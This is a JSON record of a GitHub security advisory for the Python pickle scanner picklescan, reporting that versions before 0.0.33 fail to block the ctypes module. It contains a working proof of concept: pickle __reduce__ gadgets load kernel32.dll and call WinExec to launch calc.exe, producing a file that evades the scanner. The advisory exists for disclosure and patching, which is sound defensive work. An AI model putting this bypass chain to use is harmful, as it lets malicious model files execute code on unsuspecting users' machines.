{
  "Severity": "HIGH",
  "UpdatedAt": "2025-12-29T15:23:51Z",
  "Package": {
    "Ecosystem": "PIP",
    "Name": "picklescan"
  },
  "Advisory": {
    "DatabaseId": 328839,
    "Id": "GSA_kwCzR0hTQS00Njc1LTM2Zjktd2Y2cs4ABQSH",
    "GhsaId": "GHSA-4675-36f9-wf6r",
    "References": [
      {
        "Url": "https://github.com/mmaitre314/picklescan/security/advisories/GHSA-4675-36f9-wf6r"
      },
      {
        "Url": "https://github.com/mmaitre314/picklescan/pull/53"
      },
      {
        "Url": "https://github.com/mmaitre314/picklescan/commit/70c1c6c31beb6baaf52c8db1b6c3c0e84a6f9dab"
      },
      {
        "Url": "https://github.com/mmaitre314/picklescan/releases/tag/v0.0.33"
      },
      {
        "Url": "https://github.com/advisories/GHSA-4675-36f9-wf6r"
      }
    ],
    "Identifiers": [
      {
        "Type": "GHSA",
        "Value": "GHSA-4675-36f9-wf6r"
      }
    ],
    "Description": "### Summary\nPicklescan doesnt flag ctypes module as a dangerous module, which is a huge issue. ctypes is basically a foreign function interface library and can be used to\n* Load DLLs\n* Call C functions directly\n* Manipulate memory raw pointers.\n\nThis can allow attackers to achieve RCE by invoking direct syscalls without going through blocked modules. Another major issue that ctypes being allowed presents is that it can be used down the line to dismantle interpreter based python sandboxes as ctypes allow direct access to raw memory.\n\nThis is a more severe loophole than normal gadget chains and bypasses as raw memory access can be used for a lot of nefarious purposes down the line if left undetected\n\n### PoC\n```python\nimport pickle\nimport ctypes\nimport operator\n\nclass Kernel32Loader:\n    def __reduce__(self):\n        #we go direct to the kerneeellllllll\n        return (ctypes.WinDLL, (\"kernel32.dll\",))\n\nclass WinExecGetter:\n    def __reduce__(self):\n        return (operator.itemgetter(\"WinExec\"), (Kernel32Loader(),))\n\nclass PopCalc:\n    def __reduce__(self):\n        #methodcaller to invoke \"__call__\" on the function pointer.\n        return (\n            operator.methodcaller(\"__call__\", b\"calc.exe\", 1), \n            (WinExecGetter(),)\n        )\n\ntry:\n    payload = pickle.dumps(PopCalc())\n    \n    with open(\"calc_exploit.pkl\", \"wb\") as f:\n        f.write(payload)\n        \n    print(\"Generated 'calc_exploit.pkl'\")\n\nexcept Exception as e:\n    print(f\"Generation failed: {e}\")\n```\nThis will create a pickle file which is not detected by the latest version of picklescan as malicious\n\n```python\nimport pickle\nprint(\"Loading bypass.pkl...\")\npickle.load(open(\"calc_exploit.pkl\", \"rb\"))\n```\n\n\u003cimg width=\"1333\" height=\"677\" alt=\"image\" src=\"https://github.com/user-attachments/assets/f5b066f3-116a-4377-a538-f293f3a6c176\" /\u003e",
    "Origin": "UNSPECIFIED",
    "PublishedAt": "2025-12-29T15:23:49Z",
    "Severity": "HIGH",
    "Summary": "Picklescan does not block ctypes",
    "UpdatedAt": "2025-12-29T15:23:51Z",
    "WithdrawnAt": "",
    "CVSS": {
      "Score": 0,
      "VectorString": ""
    }
  },
  "Versions": [
    {
      "FirstPatchedVersion": {
        "Identifier": "0.0.33"
      },
      "VulnerableVersionRange": "\u003c 0.0.33"
    },
    {
      "FirstPatchedVersion": {
        "Identifier": "0.0.33"
      },
      "VulnerableVersionRange": "\u003c 0.0.33"
    }
  ]
}